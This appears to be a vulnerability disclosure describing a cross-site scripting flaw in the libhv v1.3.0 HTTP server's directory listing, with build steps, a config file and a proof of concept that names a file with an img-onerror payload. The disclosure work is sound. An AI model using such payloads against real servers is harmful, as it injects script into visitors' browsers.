Cross-Site Scripting in libhv@v1.3.0

 [Raw](/dellalibera/c53448135480cbe12257c4b413a90d20/raw/2aa1a0595bc2a8e06ab9940b0b87a6a4f06f223b/01_Cross-Site_Scripting_libhv%40v1.3.0.md)

[**01\_Cross-Site\_Scripting\_libhv@v1.3.0.md**](#file-01_cross-site_scripting_libhv-v1-3-0-md)

# Information

**Project:** `libhv`

**Tested Version:** `v1.3.0` (commit `579938146ff0cd99d379c038bea80d3241c5bc36`)

**Github Repository:** [`https://github.com/ithewei/libhv`](https://github.com/ithewei/libhv)

## Details

`libhv` is vulnerable to **Cross-Site Scripting (XSS)** when a file which name contains an XSS payload is served by the application, the filename is displayed without proper sanitiziation when is rendered (<https://github.com/ithewei/libhv/blob/579938146ff0cd99d379c038bea80d3241c5bc36/http/server/http_page.cpp#L59>).

## Setup

Install and build the project <https://github.com/ithewei/libhv#%EF%B8%8F-build>

```
git clone https://github.com/ithewei/libhv.git
cd libhv
mkdir build
cd build
cmake ..
cmake --build .

```
## PoC

This PoC demonstrates how it's possible to trigger an XSS if malicious content is served using `libhv/bin/httpd` program.

* create the following files/folders, including the file with an XSS payload (under `downloads` folder):

```
mkdir poc/
cd poc/
mkdir html
mkdir html/downloads
echo "Welcome Page" > ./html/index.html
touch ./html/downloads/'"><img src=x onerror=alert(document.domain)>"'

```

* use the following `httpd.conf` file:

```
# [root]

loglevel = INFO
log_remain_days = 3
log_filesize = 64M

worker_processes = auto
worker_threads = 1

worker_connections = 1024

http_port = 8080
https_port = 8443
document_root = html
home_page = index.html
index_of = /downloads/
limit_rate = 500 # KB/s
cors = yes
forward_proxy = no

```

* the final folder structure should be the following:

```
libhv/
poc/
    httpd.conf
    html/
        index.html
        downloads/
            '"><img src=x onerror=alert(document.domain)>"'

```

* inside `poc` folder, run the following command to start the `httpd` program

```
../libhv/build/bin/httpd -c ./httpd.conf

```

* visit `http://localhost:8080/downloads/` and an alert will appear
